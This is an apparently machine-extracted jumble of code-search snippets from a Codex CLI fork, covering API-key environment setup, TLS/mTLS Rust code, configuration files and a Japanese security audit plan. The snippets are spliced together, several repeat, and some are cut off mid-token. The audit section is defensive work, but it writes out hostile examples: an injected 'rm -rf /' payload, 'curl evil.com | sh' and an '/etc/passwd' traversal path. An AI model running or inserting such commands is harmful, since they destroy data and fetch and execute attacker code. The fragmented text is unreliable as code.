        "contents": "#### 3. セキュアな設定方法（.env ファイル使用）\n\n&#96;&#96;&#96;bash\n# ~/.codex/.env ファイルを作成\nmkdir -p ~/.codex\nnano ~/.codex/.env\n\n# .envファイルに記述\nOPENAI_API_KEY=sk-proj-XXXXXXXXXXXXXXXXXXXX\nCODEX_API_KEY=sk-proj-XXXXXXXXXXXXXXXXXXXX\nGITHUB_TOKEN=ghp_XXXXXXXXXXXXXXXXXXXX\nGEMINI_API_KEY=AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXX\n\n# パーミッション設定（自分だけ読み書き可能）\nchmod 600 ~/.codex/.env\n\n# .bashrc / .zshrcから読み込み\necho 'set -a; source ~/.codex/.env; set +a' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\n&#96;&#96;&#96;\n\n---\n\n## 🔄 設定の優先順位\n\nCodexは以下の優先順位でAPIキーを読み込みます：\n\n### 優先度1: &#96;CODEX_API_KEY&#96; 環境変数 🥇\n\n&#96;&#96;&#96;bash\nexport CODEX_API_KEY=\"sk-proj-XXXX\"\n&#96;&#96;&#96;\n\n- **最優先**: この環境変数が設定されていれば、他の設定より優先\n- **推奨用途**: Codex専用のAPIキーを使用する場合\n\n### 優先度2: &#96;auth.json&#96; ファイル 🥈\n\n&#96;&#96;&#96;bash\n~/.codex/auth.json\n&#96;&#96;&#96;\n\n- **自動生成**: &#96;codex login&#96; コマンドで自動作成\n- **OAuth対応**: ChatGPT OAuth認証にも対応\n\n### 優先度3: &#96;OPENAI_API_KEY&#96; 環境変数 🥉\n\n&#96;&#96;&#96;bash\nexport OPENAI_API_KEY=\"sk-proj-XXXX\"\n&#96;&#96;&#96;\n\n- **汎用**: OpenAI APIを使用する他のツールと共通\n- **フォールバック**: &#96;CODEX_API_KEY&#96;が未設定の場合に使用\n\n---\n\n## ✅ 設定確認方法\n\n### 1. 環境変数の確認\n\n**Windows PowerShell:**\n&#96;&#96;&#96;powershell\n# 現在の環境変数を確認\nGet-ChildItem Env: | Where-Object { $_.Name -like \"*API_KEY*\" -or $_.Name -like \"*TOKEN*\" }\n\n# 特定の環境変数を確認\necho $env:CODEX_API_KEY\necho $env:OPENAI_API_KEY\necho $env:GITHUB_TOKEN\necho $env:GEMINI_API_KEY\n&#96;&#96;&#96;\n\n**Linux/macOS:**\n&#96;&#96;&#96;bash\n# 現在の環境変数を確認\nenv | grep -E \"(API_KEY|TOKEN)\"\n\n# 特定の環境変数を確認\necho $CODEX_API_KEY\necho $OPENAI_API_KEY\necho $GITHUB_TOKEN\necho $GEMINI_API_KEY\n&#96;&#96;&#96;\n\n### 2. Codexの認証状態確認\n\n&#96;&#96;&#96;bash\n# Codexがどの認証方法を使用しているか確認\ncodex --help",

        "contents": "# 🔒 環境変数によるAPIキー管理実装完了レポート\n\n**作成日**: 2025-11-02 (日)  \n**プロジェクト**: Codex v0.56.0-zapabob  \n**担当者**: Cursor Agent  \n**ステータス**: ✅ 実装確認完了・ドキュメント整備完了\n\n---\n\n## 📋 実装サマリー\n\n### 🎯 目的\nconfig.tomlへのAPIキーハードコードを避け、環境変数で安全に管理する仕組みを確立する。\n\n### ✅ 結果\n**既に完全実装済み**であることを確認。セキュリティベストプラクティスに完全準拠。\n\n---\n\n## 🔍 実装状況の詳細調査\n\n### 1. 環境変数読み込み機構（auth.rs）\n\n**ファイル**: &#96;codex-rs/core/src/auth.rs&#96; 209-224行\n\n&#96;&#96;&#96;rust\npub const OPENAI_API_KEY_ENV_VAR: &amp;str = \"OPENAI_API_KEY\";\npub const CODEX_API_KEY_ENV_VAR: &amp;str = \"CODEX_API_KEY\";\n\npub fn read_openai_api_key_from_env() -&gt; Option&lt;String&gt; {\n    env::var(OPENAI_API_KEY_ENV_VAR)\n        .ok()\n        .map(|value| value.trim().to_string())\n        .filter(|value| !value.is_empty())\n}\n\npub fn read_codex_api_key_from_env() -&gt; Option&lt;String&gt; {\n    env::var(CODEX_API_KEY_ENV_VAR)\n        .ok()\n        .map(|value| value.trim().to_string())\n        .filter(|value| !value.is_empty())\n}\n&#96;&#96;&#96;\n\n**特徴**:\n- ✅ 環境変数の値をトリム（前後の空白を除去）\n- ✅ 空文字列を除外（未設定扱い）\n- ✅ 2種類の環境変数をサポート（&#96;CODEX_API_KEY&#96;, &#96;OPENAI_API_KEY&#96;）\n\n---\n\n### 2. 認証優先順位制御（auth.rs）\n\n**ファイル**: &#96;codex-rs/core/src/auth.rs&#96; 356-399行\n\n&#96;&#96;&#96;rust\nfn load_auth(\n    codex_home: &amp;Path,\n    enable_codex_api_key_env: bool,\n    auth_credentials_store_mode: AuthCredentialsStoreMode,\n) -&gt; std::io::Result&lt;Option&lt;CodexAuth&gt;&gt; {\n    // 🥇 Priority 1: CODEX_API_KEY environment variable",

        "contents": "# Codex v2.0.0 Environment Variables Sample\n# このファイルを .env にコピーして実際の値を設定してください\n\n# ==================== 必須（Required） ====================\n\n# OpenAI API Key - メインのLLM接続に必要\n# 取得方法: https://platform.openai.com/api-keys\nOPENAI_API_KEY=sk-proj-your-api-key-here\n\n# ==================== オプション（Optional） ====================\n\n# GitHub Personal Access Token - GitHub MCP Server、コード連携用\n# 取得方法: https://github.com/settings/tokens\n# 権限: repo, read:org\nGITHUB_TOKEN=ghp_your_github_token_here\n\n# Slack Webhook URL - 通知・監視用\n# 取得方法: https://api.slack.com/messaging/webhooks\nSLACK_WEBHOOK_URL=https://hooks.slack.com/services/YOUR/WEBHOOK/URL\n\n# Brave Search API Key - Web検索用（Deep Research）\n# 取得方法: https://brave.com/search/api/\nBRAVE_API_KEY=your_brave_api_key_here\n\n# ==================== GPU加速（GPU Acceleration） ====================\n\n# CUDA Device ID - 使用するGPUデバイス番号（デフォルト: 0）\nCUDA_DEVICE=0\n\n# ==================== ログ・デバッグ（Logging &amp; Debug） ====================\n\n# Rust Log Level - ログレベル設定\nRUST_LOG=info\n\n# ==================== 使用例（Usage Examples） ====================\n\n# CUDA加速:\n#   codex --use-cuda \"Analyze codebase\"\n#\n# Windows AI加速:\n#   codex --use-windows-ai \"Your task\"\n#\n# git解析（CUDA、100,000コミット）:\n#   codex git-analyze commits --use-cuda --limit 100000",

When the async reqwest client's\n/// timeout calls &#96;tokio::time::sleep()&#96;, it panics with \"no reactor running\".\nfn build_http_client(\n    tls: &amp;OtelTlsConfig,\n    timeout_var: &amp;str,\n) -&gt; Result&lt;reqwest::blocking::Client, Box&lt;dyn Error&gt;&gt; {\n    // Wrap in block_in_place because reqwest::blocking::Client creates its own\n    // internal tokio runtime, which would panic if built directly from an async context.\n    tokio::task::block_in_place(|| build_http_client_inner(tls, timeout_var))\n}\n\nfn build_http_client_inner(\n    tls: &amp;OtelTlsConfig,\n    timeout_var: &amp;str,\n) -&gt; Result&lt;reqwest::blocking::Client, Box&lt;dyn Error&gt;&gt; {\n    let mut builder =\n        reqwest::blocking::Client::builder().timeout(resolve_otlp_timeout(timeout_var));\n\n    if let Some(path) = tls.ca_certificate.as_ref() {\n        let (pem, location) = read_bytes(path)?;\n        let certificate = ReqwestCertificate::from_pem(pem.as_slice()).map_err(|error| {\n            config_error(format!(\n                \"failed to parse certificate {}: {error}\",\n                location.display()\n            ))\n        })?;\n        // Disable built-in root certificates and use only our custom CA\n        builder = builder\n            .tls_built_in_root_certs(false)\n            .add_root_certificate(certificate);\n    }\n\n    match (&amp;tls.client_certificate, &amp;tls.client_private_key)",

        "range": {

        "contents": "# Codex Secure Configuration (TLS/mTLS + Encrypted Agents)\n# バージョン: v0.51.0-zapabob.1 (Secure Edition)\n# 作成日: 2025-10-28\n# 設計書: _docs/2025-10-28_セキュア通信アーキテクチャ設計書.md\n#\n# 📋 使用方法:\n#   1. zapabob/scripts/generate-mcp-certs.ps1 を実行して証明書生成\n#   2. config.toml をこのファイルで置き換えるか、設定をマージ\n#   3. codex --config config-secure.toml で起動\n\n# ==================== 基本設定 ====================\nmodel = \"gpt-5-codex\"\n\n# 🆕 MCP Client機能を有効化\nexperimental_use_rmcp_client = true\n\n# 🔍 Web検索機能を有効化（モデル組み込み検索）\nenable_web_search = true\n\n# ==================== 機能フラグ ====================\n[features]\n# Web検索機能（モデル組み込み）\nweb_search = true\n# MCP統合\nmcp_integration = true\n# 🔐 セキュアモード（TLS/mTLS + 暗号化）\nsecure_mode = true\n\n# ==================== OpenAI Provider ====================\n[model_providers.openai]\nbase_url = \"https://api.openai.com/v1\"\nenv_key = \"OPENAI_API_KEY\"\nname = \"OpenAI (Chat Completions API)\"\nrequires_openai_auth = true\nwire_api = \"chat\"\nenable_web_search = true\nweb_search_grounding = true\n\n# ==================== セキュリティ ====================\n[security]\n# ゼロトラストモード\nzero_trust_mode = true\n\n# TLS/mTLS設定\ntls_enabled = true\ntls_version = \"1.3\"  # TLS 1.3のみ許可（TLS 1.2以下は拒否）\nmtls_enabled = true  # 相互TLS認証（クライアント証明書必須）\n\n[security.certificates]\n# 証明書パス（~/.codex/certs/）\nca_cert = \"~/.codex/certs/ca/ca-cert.pem\"\nclient_cert = \"~/.codex/certs/codex/codex-cert.pem\"\nclient_key = \"~/.codex/certs/codex/codex-key.pem\"\nverify_peer = true  # ピア証明書の検証を強制\n\n# 証明書ローテーション\n[security.certificates.rotation]\nenabled = true\nrotation_days = 90  # 90日ごとに自動ローテーション\nwarn_before_expiry_days = 14  # 14日前に警告\n\n[security.signing]",

        "contents": "    tls_config: Arc&lt;ClientConfig&gt;,\n}\n\nimpl SecureMcpConnectionManager {\n    /// Create a new secure connection manager\n    pub fn new(config: &amp;SecureMcpConfig) -&gt; Result&lt;Self&gt; {\n        let tls_config = Self::build_tls_config(config)?;\n\n        Ok(Self {\n            tls_config: Arc::new(tls_config),\n        })\n    }\n\n    /// Build TLS 1.3 configuration\n    fn build_tls_config(config: &amp;SecureMcpConfig) -&gt; Result&lt;ClientConfig&gt; {\n        // Load CA certificates (root of trust)\n        let ca_certs = Self::load_ca_certificates(&amp;config.ca_cert_path)?;\n\n        let mut root_store = RootCertStore::empty();\n        for cert in ca_certs {\n            root_store\n                .add(cert)\n                .context(\"Failed to add CA cert to root store\")?;\n        }\n\n        // Build TLS config based on whether mTLS is enabled\n        let tls_config = if let (Some(client_cert_path), Some(client_key_path)) =\n            (&amp;config.client_cert_path, &amp;config.client_key_path)\n        {\n            // mTLS: Load client certificate and key\n            let client_certs = Self::load_certificates(client_cert_path)?;\n            let client_key = Self::load_private_key(client_key_path)?;\n\n            ClientConfig::builder()\n                .with_root_certificates(root_store)\n                .with_client_auth_cert(client_certs, client_key)\n                .context(\"Failed to configure TLS with client auth\")?\n        } else {\n            // TLS only (no client certificate)\n            ClientConfig::builder()\n                .with_root_certificates(root_store)\n                .with_no_client_auth()\n        };\n\n        Ok(tls_config)\n    }\n\n    /// Load CA certificates from PEM file\n    fn load_ca_certificates(path: &amp;str) -&gt; {\n            return Err(config_error(\n                \"client_certificate and client_private_key must both be provided for mTLS\",\n            ));\n        }\n        (None, None) =&gt; {}\n    }\n\n    builder\n        .build()\n        .map_err(|error| Box::new(error) as Box&lt;dyn Error&gt;)\n}\n\nfn resolve_otlp_timeout(signal_var: &amp;str) -&gt;         "contents": "env.OPENAI_API_KEY = \"${OPENAI_API_KEY}\"\nenv.GITHUB_TOKEN = \"${GITHUB_TOKEN}\"\nenv.SLACK_WEBHOOK_URL = \"${SLACK_WEBHOOK_URL}\"\nstartup_timeout_sec = 60\n\n# 🔒 TLS/mTLS設定\ntransport = \"https\"  # 🆕 HTTPSに変更（stdio→TCP+TLS）\nbind_address = \"127.0.0.1:8001\"\ntls_cert = \"~/.codex/certs/mcp-servers/codex-cert.pem\"\ntls_key = \"~/.codex/certs/mcp-servers/codex-key.pem\"\nrequire_client_cert = true  # mTLS必須\n\n# 🔐 認証設定\nauth_method = \"mtls\"  # mTLS認証\ntrusted_ca = \"~/.codex/certs/ca/ca-cert.pem\"\n\n# Serena - AIオーケストレーション（TLS/mTLS）\n[mcp_servers.serena]\ncommand = \"npx\"\nargs = [\"-y\", \"@modelcontextprotocol/server-everything\"]\ntransport = \"https\"\nbind_address = \"127.0.0.1:8002\"\ntls_cert = \"~/.codex/certs/mcp-servers/serena-cert.pem\"\ntls_key = \"~/.codex/certs/mcp-servers/serena-key.pem\"\nrequire_client_cert = true\nauth_method = \"mtls\"\n\n# Gemini CLI - Google Gemini AI統合（TLS/mTLS）\n[mcp_servers.codex-gemini-mcp]\ncommand = \"codex-gemini-mcp\"\nargs = []\ntransport = \"https\"\nbind_address = \"127.0.0.1:8003\"\ntls_cert = \"~/.codex/certs/mcp-servers/gemini-cli-cert.pem\"\ntls_key = \"~/.codex/certs/mcp-servers/gemini-cli-key.pem\"\nrequire_client_cert = true\nauth_method = \"mtls\"\n\n# Filesystem - GitHub API（TLS/mTLS）\n[mcp_servers.github]\ncommand = \"npx\"\nargs = [\"-y\", \"@modelcontextprotocol/server-github\"]\nenv.GITHUB_PERSONAL_ACCESS_TOKEN = \"${GITHUB_TOKEN}\"\ntransport = \"https\"\nbind_address = \"127.0.0.1:8005\"\ntls_cert = \"~/.codex/certs/mcp-servers/github-cert.pem\"\ntls_key = \"~/.codex/certs/mcp-servers/github-key.pem\"\nrequire_client_cert = true\nauth_method = \"mtls\"\n\n# Chrome DevTools -     {
      "codeBlock": {
        "relativeWorkspacePath": ".\\docs\\config-examples\\config-secure.toml",
        "range": {
          "startPosition": {},
          "endPosition": {
            "line": 62
          }
        },
        "contents": "# Codex Secure Configuration (TLS/mTLS + Encrypted Agents)\n# バージョン: v0.51.0-zapabob.1 (Secure Edition)\n# 作成日: 2025-10-28\n# 設計書: _docs/2025-10-28_セキュア通信アーキテクチャ設計書.md\n#\n# 📋 使用方法:\n#   1. zapabob/scripts/generate-mcp-certs.ps1 を実行して証明書生成\n#   2. config.toml をこのファイルで置き換えるか、設定をマージ\n#   3. codex --config config-secure.toml で起動\n\n# ==================== 基本設定 ====================\nmodel = \"gpt-5-codex\"\n\n# 🆕 MCP Client機能を有効化\nexperimental_use_rmcp_client = true\n\n# 🔍 Web検索機能を有効化（モデル組み込み検索）\nenable_web_search = true\n\n# ==================== 機能フラグ ====================\n[features]\n# Web検索機能（モデル組み込み）\nweb_search = true\n# MCP統合\nmcp_integration = true\n# 🔐 セキュアモード（TLS/mTLS + 暗号化）\nsecure_mode = true\n\n# ==================== OpenAI Provider ====================\n[model_providers.openai]\nbase_url = \"https://api.openai.com/v1\"\nenv_key = \"OPENAI_API_KEY\"\nname = \"OpenAI (Chat Completions API)\"\nrequires_openai_auth = true\nwire_api = \"chat\"\nenable_web_search = true\nweb_search_grounding = true\n\n# ==================== セキュリティ ====================\n[security]\n# ゼロトラストモード\nzero_trust_mode = true\n\n# TLS/mTLS設定\ntls_enabled = true\ntls_version = \"1.3\"  # TLS 1.3のみ許可（TLS 1.2以下は拒否）\nmtls_enabled = true  # 相互TLS認証（クライアント証明書必須）\n\n[security.certificates]\n# 証明書パス（~/.codex/certs/）\nca_cert = \"~/.codex/certs/ca/ca-cert.pem\"\nclient_cert = \"~/.codex/certs/codex/codex-cert.pem\"\nclient_key = \"~/.codex/certs/codex/codex-key.pem\"\nverify_peer = true  # ピア証明書の検証を強制\n\n# 証明書ローテーション\n[security.certificates.rotation]\nenabled = true\nrotation_days = 90  # 90日ごとに自動ローテーション\nwarn_before_expiry_days = 14  # 14日前に警告\n\n[security.signing]",
        "signatures": {},
        "detailedLines": [
          {
            "text": "# Codex Secure Configuration (TLS/mTLS + Encrypted Agents)",
            "lineNumber": 1

    {
      "codeBlock": {
        "relativeWorkspacePath": ".\\docs\\config-examples\\config-secure.toml",
        "range": {
          "startPosition": {},
          "endPosition": {
            "line": 62
          }
        },
        "contents": "# Codex Secure Configuration (TLS/mTLS + Encrypted Agents)\n# バージョン: v0.51.0-zapabob.1 (Secure Edition)\n# 作成日: 2025-10-28\n# 設計書: _docs/2025-10-28_セキュア通信アーキテクチャ設計書.md\n#\n# 📋 使用方法:\n#   1. zapabob/scripts/generate-mcp-certs.ps1 を実行して証明書生成\n#   2. config.toml をこのファイルで置き換えるか、設定をマージ\n#   3. codex --config config-secure.toml で起動\n\n# ==================== 基本設定 ====================\nmodel = \"gpt-5-codex\"\n\n# 🆕 MCP Client機能を有効化\nexperimental_use_rmcp_client = true\n\n# 🔍 Web検索機能を有効化（モデル組み込み検索）\nenable_web_search = true\n\n# ==================== 機能フラグ ====================\n[features]\n# Web検索機能（モデル組み込み）\nweb_search = true\n# MCP統合\nmcp_integration = true\n# 🔐 セキュアモード（TLS/mTLS + 暗号化）\nsecure_mode = true\n\n# ==================== OpenAI Provider ====================\n[model_providers.openai]\nbase_url = \"https://api.openai.com/v1\"\nenv_key = \"OPENAI_API_KEY\"\nname = \"OpenAI (Chat Completions API)\"\nrequires_openai_auth = true\nwire_api = \"chat\"\nenable_web_search = true\nweb_search_grounding = true\n\n# ==================== セキュリティ ====================\n[security]\n# ゼロトラストモード\nzero_trust_mode = true\n\n# TLS/mTLS設定\ntls_enabled = true\ntls_version = \"1.3\"  # TLS 1.3のみ許可（TLS 1.2以下は拒否）\nmtls_enabled = true  # 相互TLS認証（クライアント証明書必須）\n\n[security.certificates]\n# 証明書パス（~/.codex/certs/）\nca_cert = \"~/.codex/certs/ca/ca-cert.pem\"\nclient_cert = \"~/.codex/certs/codex/codex-cert.pem\"\nclient_key = \"~/.codex/certs/codex/codex-key.pem\"\nverify_peer = true  # ピア証明書の検証を強制\n\n# 証明書ローテーション\n[security.certificates.rotation]\nenabled = true\nrotation_days = 90  # 90日ごとに自動ローテーション\nwarn_before_expiry_days = 14  # 14日前に警告\n\n[security.signing]",
        "signatures": {},

        "contents": " {\n        let path = Self::expand_path(path);\n        let file = File::open(&amp;path)\n            .with_context(|| format!(\"Failed to open private key file: {}\", path))?;\n        let mut reader = BufReader::new(file);\n\n        // Try RSA keys first\n        let keys = rsa_private_keys(&amp;mut reader)\n            .collect::&lt;Result&lt;Vec&lt;_&gt;, _&gt;&gt;()\n            .context(\"Failed to parse RSA private key\")?;\n\n        if keys.is_empty() {\n            anyhow::bail!(\"No private keys found in file: {}\", path);\n        }\n\n        // Return first key\n        Ok(rustls::pki_types::PrivateKeyDer::Pkcs1(\n            keys.into_iter().next().unwrap(),\n        ))\n    }\n\n    /// Expand ~ in path to home directory\n    fn expand_path(path: &amp;str) -&gt; String {\n        if path.starts_with(\"~/\") {\n            if let Some(home) = dirs::home_dir() {\n                return home.join(&amp;path[2..]).to_string_lossy().to_string();\n            }\n        }\n        path.to_string()\n    }\n\n    /// Connect to MCP server with TLS 1.3\n    pub async fn connect_tls(\n        &amp;self,\n        server_name: &amp;str,\n        server_addr: &amp;str,\n    ) -&gt; Result&lt;tokio_rustls::client::TlsStream&lt;TcpStream&gt;&gt; {\n        // Establish TCP connection\n        let tcp_stream = TcpStream::connect(server_addr)\n            .await\n            .with_context(|| format!(\"Failed to connect to {}\", server_addr))?;\n\n        // Create TLS connector\n        let connector = TlsConnector::from(Arc::clone(&amp;self.tls_config));\n\n        // Perform TLS handshake\n        let domain = rustls::pki_types::ServerName::try_from(server_name.to_owned())\n            .context(\"Invalid server name\")?;\n\n        let tls_stream = connector\n            .connect(domain, tcp_stream)\n            .await\n            .context(\"TLS handshake failed\")?;\n\n        Ok(tls_stream)\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]",

        "contents": "// Based on design document: _docs/2025-10-28_セキュア通信アーキテクチャ設計書.md\n\nuse anyhow::Context;\nuse anyhow::Result;\nuse rustls::ClientConfig;\nuse rustls::RootCertStore;\nuse rustls_pemfile::certs;\nuse rustls_pemfile::rsa_private_keys;\nuse std::fs::File;\nuse std::io::BufReader;\nuse std::sync::Arc;\nuse tokio::net::TcpStream;\nuse tokio_rustls::TlsConnector;\n\n/// TLS configuration for MCP connections\n#[derive(Debug, Clone)]\npub struct SecureMcpConfig {\n    /// Path to CA certificate (root of trust)\n    pub ca_cert_path: String,\n\n    /// Path to client certificate (for mTLS)\n    pub client_cert_path: Option&lt;String&gt;,\n\n    /// Path to client private key (for mTLS)\n    pub client_key_path: Option&lt;String&gt;,\n\n    /// Verify peer certificate (should always be true in production)\n    pub verify_peer: bool,\n\n    /// TLS version (only \"1.3\" supported)\n    pub tls_version: String,\n}\n\nimpl Default for SecureMcpConfig {\n    fn default() -&gt; Self {\n        Self {\n            ca_cert_path: String::from(\"~/.codex/certs/ca/ca-cert.pem\"),\n            client_cert_path: None,\n            client_key_path: None,\n            verify_peer: true,\n            tls_version: String::from(\"1.3\"),\n        }\n    }\n}\n\n/// Secure MCP Connection Manager (TLS 1.3 + mTLS)\npub struct SecureMcpConnectionManager {\n    /// TLS configuration\n    tls_config: Arc&lt;ClientConfig&gt;,\n}\n\nimpl SecureMcpConnectionManager",

        "contents": "# Chrome DevTools - ブラウザ自動化（TLS/mTLS）\n[mcp_servers.chrome-devtools]\ncommand = \"npx\"\nargs = [\"-y\", \"@modelcontextprotocol/server-chrome\"]\ntransport = \"https\"\nbind_address = \"127.0.0.1:8006\"\ntls_cert = \"~/.codex/certs/mcp-servers/chrome-devtools-cert.pem\"\ntls_key = \"~/.codex/certs/mcp-servers/chrome-devtools-key.pem\"\nrequire_client_cert = true\nauth_method = \"mtls\"\n\n# Sequential Thinking - 段階的思考（TLS/mTLS）\n[mcp_servers.sequential-thinking]\ncommand = \"npx\"\nargs = [\"-y\", \"@modelcontextprotocol/server-sequential-thinking\"]\ntransport = \"https\"\nbind_address = \"127.0.0.1:8007\"\ntls_cert = \"~/.codex/certs/mcp-servers/sequential-thinking-cert.pem\"\ntls_key = \"~/.codex/certs/mcp-servers/sequential-thinking-key.pem\"\nrequire_client_cert = true\nauth_method = \"mtls\"\n\n# ... (他のMCPサーバーも同様にTLS/mTLS設定)\n\n# ==================== サブエージェント ====================\n[subagents]\nenabled = true\nmax_parallel = 4\ntoken_budget = 40000\ninherit_model = true\nuse_codex_mcp = true\n\n# 🔐 セキュア通信有効化\nsecure_channel = true\nencryption_enabled = true\nsigning_enabled = true\n\n# ==================== Deep Research ====================\n[deep_research]\nenabled = true\ndefault_backend = \"gemini\"  # Gemini Search Grounding\nfallback_backends = [\"duckduckgo\", \"google\", \"bing\"]\nmax_sources = 10\ncitation_style = \"academic\"\n\n# ==================== セキュリティモニタリング ====================\n[monitoring]\nenabled = true\nprometheus_endpoint = \"http://localhost:9090\"\ngrafana_dashboard_url = \"http://localhost:3000/d/codex-security\"\n\n[monitoring.metrics]\n# 収集するメトリクス\ncollect_tls_metrics = true\ncollect_auth_metrics = true\ncollect_rate_limit_metrics = true\ncollect_agent_metrics = true\n\n[monitoring.export]\n# メトリクスのエクスポート\nformat = \"prometheus\"\nexport_interval_sec = 30\n\n# ==================== バックアップ ====================\n[backup]\nenabled = true\nbackup_dir = \"~/.codex/backups\"\nbackup_interval_hours = 24\nretention_days = 30\n\n# バックアップ対象",

        "contents": "    let processor = BatchSpanProcessor::builder(span_exporter).build();\n\n    Ok(SdkTracerProvider::builder()\n        .with_resource(resource.clone())\n        .with_span_processor(processor)\n        .build())\n}\n\nfn build_header_map(headers: &amp;HashMap&lt;String, String&gt;) -&gt; HeaderMap {\n    let mut header_map = HeaderMap::new();\n    for (key, value) in headers {\n        if let Ok(name) = HeaderName::from_bytes(key.as_bytes())\n            &amp;&amp; let Ok(val) = HeaderValue::from_str(value)\n        {\n            header_map.insert(name, val);\n        }\n    }\n    header_map\n}\n\nfn build_grpc_tls_config(\n    endpoint: &amp;str,\n    tls_config: ClientTlsConfig,\n    tls: &amp;OtelTlsConfig,\n) -&gt; Result&lt;ClientTlsConfig, Box&lt;dyn Error&gt;&gt; {\n    let uri: Uri = endpoint.parse()?;\n    let host = uri.host().ok_or_else(|| {\n        config_error(format!(\n            \"OTLP gRPC endpoint {endpoint} does not include a host\"\n        ))\n    })?;\n\n    let mut config = tls_config.domain_name(host.to_owned());\n\n    if let Some(path) = tls.ca_certificate.as_ref() {\n        let (pem, _) = read_bytes(path)?;\n        config = config.ca_certificate(TonicCertificate::from_pem(pem));\n    }\n\n    match (&amp;tls.client_certificate, &amp;tls.client_private_key) {\n        (Some(cert_path), Some(key_path)) =&gt; {\n            let (cert_pem, _) = read_bytes(cert_path)?;\n            let (key_pem, _) = read_bytes(key_path)?;\n            config = config.identity(TonicIdentity::from_pem(cert_pem, key_pem));\n        }\n        (Some(_), None) | (None, Some(_)) =&gt; {\n            return Err(config_error(\n                \"client_certificate and client_private_key must both be provided for mTLS\",\n            ));\n        }\n        (None, None) =&gt; {}\n    }\n\n    Ok(config)\n}\n\n/// Build a blocking HTTP client with TLS configuration for the OTLP HTTP exporter.\n///\n/// We use &#96;reqwest::blocking::Client&#96; instead of the async client because the\n/// &#96;opentelemetry_sdk&#96; &#96;BatchLogProcessor&#96; spawns a dedicated OS thread that uses\n/// &#96;futures_executor::block_on()&#96; rather than tokio. When the async reqwest client's\n/// timeout calls &#96;tokio::time::sleep()&#96;, it panics with \"no reactor running\".",

        "contents": "export class CodexAPIClient {\nconstructor(baseUrl = 'http://localhost:8787') {\n\n  }\n\n  // HTTP Request helper\n  private async httpRequest&lt;T&gt;(\n    method: string,\n    params?: any,\n    endpoint?: string\n  ): Promise&lt;T&gt; {\n    const id = ++this.requestId;\n    const request: APIRequest = {\n      method,\n      params,\n      id,\n    };\n\n    try {\n      const response = await fetch(endpoint || this.baseUrl, {\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/json',\n        },\n        body: JSON.stringify(request),\n      });\n\n      if (!response.ok) {\n        throw new CodexAPIError(\n          response.status,\n          &#96;HTTP ${response.status}: ${response.statusText}&#96;\n        );\n      }\n\n      const data: APIResponse&lt;T&gt; = await response.json();\n\n      if (data.error) {\n        throw new CodexAPIError(data.error.code, data.error.message, data.error.data);\n      }\n\n      return data.result!;\n    } catch (error) {\n      if (error instanceof CodexAPIError) {\n        throw error;\n      }\n      throw new CodexAPIError(-1, &#96;Network error: ${error instanceof Error ? error.message : 'Unknown error'}&#96;);\n    }\n  }\n\n  // WebSocket connection for real-time updates\n  connectWebSocket(onMessage: (message: any) =&gt; void): void {\n    try\n  }\n}",

認証・認可システム\n- ネットワーク通信\n\n## 脆弱性カテゴリとチェックポイント\n\n### 1. コマンドインジェクション\n\n**危険箇所**:\n- [scripts/install-binary.js](scripts/install-binary.js) Line 105, 107, 111: &#96;exec()&#96;でユーザー入力が直接使用\n  - &#96;archivePath&#96;と&#96;destDir&#96;が適切にエスケープされていない\n  - PowerShellコマンドに直接埋め込まれている\n- [codex-rs/tui2/src/chatwidget.rs](codex-rs/tui2/src/chatwidget.rs) Line 1744: &#96;!cmd&#96;プレフィックスで直接シェル実行\n- [codex-rs/tui/src/chatwidget.rs](codex-rs/tui/src/chatwidget.rs) Line 1900: 同様の問題\n- [codex-rs/core/src/tasks/user_shell.rs](codex-rs/core/src/tasks/user_shell.rs): ユーザーシェルコマンドの検証\n\n**攻撃シナリオ**:\n- &#96;archivePath&#96;に&#96;'; rm -rf /; '&#96;のようなペイロードを注入\n- &#96;!cmd&#96;経由で&#96;rm -rf /&#96;や&#96;curl evil.com | sh&#96;を実行\n\n**修正方針**:\n- パラメータ化されたコマンド実行（引数を配列で渡す）\n- 入力サニタイゼーション（特殊文字のエスケープ）\n- ホワイトリストベースのコマンド検証\n\n### 2. パストラバーサル\n\n**危険箇所**:\n- [codex-rs/orchestrator/src/server.rs](codex-rs/orchestrator/src/server.rs) Line 575: &#96;canonicalize()&#96;は使用されているが、ベースディレクトリ制限がない\n- [codex-rs/core/src/agents/permission_checker.rs](codex-rs/core/src/agents/permission_checker.rs): パス検証ロジック\n- ファイル操作全般（read、write、delete）\n\n**攻撃シナリオ**:\n- &#96;../../../etc/passwd&#96;のような相対パスでシステムファイルにアクセス\n- シンボリックリンクを利用した権限昇格\n\n**修正方針**:\n- ベースディレクトリの制限（&#96;starts_with&#96;チェック）\n- シンボリックリンクの解決と検証\n- パスの正規化と検証\n\n### 3. バイナリ配布の改ざんリスク\n\n**危険箇所**:\n- [scripts/install-binary.js](scripts/install-binary.js): SHA256検証が実装されているが使用されていない（Line 81-93）\n- HTTPSリダイレクトの検証が不十分（Line 50-54）\n- 証明書ピニングがない\n\n**攻撃シナリオ**:\n- 中間者攻撃（MITM）でバイナリを改ざん\n- DNSハイジャックで偽のGitHubサーバーにリダイレクト\n- リリースページの改ざん\n\n**修正方針**:\n- SHA256チェックサムの必須検証\n- 証明書ピニングの実装\n- リダイレクト回数の制限\n- バイナリ署名の検証（GPG）\n\n### 4. 認証・認可の不備\n\n**危険箇所**:\n- [codex-rs/orchestrator/src/server.rs](codex-rs/orchestrator/src/server.rs): RPCメソッドの認証チェック\n- [codex-rs/core/src/agents/permission_checker.rs](codex-rs/core/src/agents/permission_checker.rs): 権限チェックロジック\n- APIキーの管理と検証\n\n**攻撃シナリオ**:\n- 認証なしでRPCメソッドを呼び出し\n- 権限チェックのバイパス\n- セッション固定攻撃\n\n**修正方針**:\n- すべてのRPCメソッドに認証チェックを追加\n- ロールベースアクセス制御（RBAC）の実装\n- セッショントークンの検証とリフレッシュ\n\n### 5. 機密情報の漏洩\n\n**危険箇所**:\n- ログ出力: APIキー、トークン、パスワードがログに記録される可能性\n- エラーメッセージ: スタックトレースに機密情報が含まれる\n- 環境変数の処理: &#96;unsafe&#96;ブロックでの&#96;env::set_var&#96;/&#96;remove_var&#96;\n\n**攻撃シナリオ**:\n- ログファイルからAPIキーを抽出\n- エラーメッセージから内部構造を推測\n- 環境変数の読み取り\n\n**修正方針**:\n- 機密情報のマスキング（ログ、エラーメッセージ）\n- セキュアなログ管理\n- 環境変数の暗号化\n\n### 6. サンドボックス回避\n\n**危険箇所**:\n- 